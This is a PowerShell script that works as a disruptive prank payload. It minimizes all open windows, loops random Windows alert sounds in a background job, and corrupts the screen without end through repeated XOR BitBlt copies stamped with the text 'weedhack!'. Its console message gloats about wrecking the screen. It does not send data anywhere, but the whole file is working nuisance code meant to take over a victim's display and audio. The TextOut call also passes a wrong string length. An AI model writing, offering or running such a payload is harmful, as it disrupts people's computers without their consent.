Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# --- Add user32 functions for minimizing windows ---
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
}
"@

# Constants
$SW_MINIMIZE = 6

# Minimize all top-level windows
[User32]::EnumWindows({ 
    param($hWnd, $lParam)
    [User32]::ShowWindow($hWnd, $SW_MINIMIZE) | Out-Null
    return $true
}, [IntPtr]::Zero)

Start-Sleep -Milliseconds 200  # give Windows a moment to minimize

# --- GDI for screen corruption and text ---
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class GDI {
    [DllImport("user32.dll")]
    public static extern IntPtr GetDC(IntPtr hwnd);

    [DllImport("user32.dll")]
    public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

    [DllImport("gdi32.dll")]
    public static extern bool BitBlt(
        IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest,
        IntPtr hdcSrc, int xSrc, int ySrc, int rop
    );

    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateFont(
        int nHeight, int nWidth, int nEscapement, int nOrientation, int fnWeight,
        uint fdwItalic, uint fdwUnderline, uint fdwStrikeOut, uint fdwCharSet,
        uint fdwOutputPrecision, uint fdwClipPrecision, uint fdwQuality,
        uint fdwPitchAndFamily, string lpszFace
    );

    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    public static extern bool TextOut(IntPtr hdc, int nXStart, int nYStart, string lpString, int cchString);
}
"@

$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$w = $screen.Width
$h = $screen.Height
$hdc = [GDI]::GetDC([IntPtr]::Zero)
Write-Host "activate screen fucker lolz - mommy starry was here :heart:"

# --- Background sound using MediaPlayer ---
$sounds = @(
    'C:\Windows\Media\chimes.wav',
    'C:\Windows\Media\notify.wav',
    'C:\Windows\Media\tada.wav',
    'C:\Windows\Media\Windows Critical Stop.wav',
    'C:\Windows\Media\Windows Exclamation.wav'
)

$soundJob = Start-Job {
    param($sounds)
    Add-Type -AssemblyName PresentationCore
    while ($true) {
        $p = New-Object System.Windows.Media.MediaPlayer
        $p.Open([Uri]($sounds | Get-Random))
        $p.Play()
        Start-Sleep -Milliseconds 100
    }
} -ArgumentList ($sounds)

# --- Create font for on-screen message ---
$font = [GDI]::CreateFont(48, 0, 0, 0, 700, 0, 0, 0, 0, 0, 0, 0, 0, "Consolas")
[void][GDI]::SelectObject($hdc, $font)

# --- Main XOR corruption loop ---
try {
    while ($true) {
        $x = Get-Random -Minimum -100 -Maximum 100
        $y = Get-Random -Minimum -100 -Maximum 100
        $rw = Get-Random -Minimum ($w / 2) -Maximum $w
        $rh = Get-Random -Minimum ($h / 2) -Maximum $h

        [GDI]::BitBlt($hdc, $x, $y, $rw, $rh, $hdc, 0, 0, 0x00660046) | Out-Null

        # Draw fixed text on top
        [GDI]::TextOut($hdc, 50, 50, "weedhack!", 20)

        Start-Sleep -Milliseconds 25
    }
}
finally {
    [GDI]::ReleaseDC([IntPtr]::Zero, $hdc)
    Stop-Job $soundJob
    Remove-Job $soundJob
}
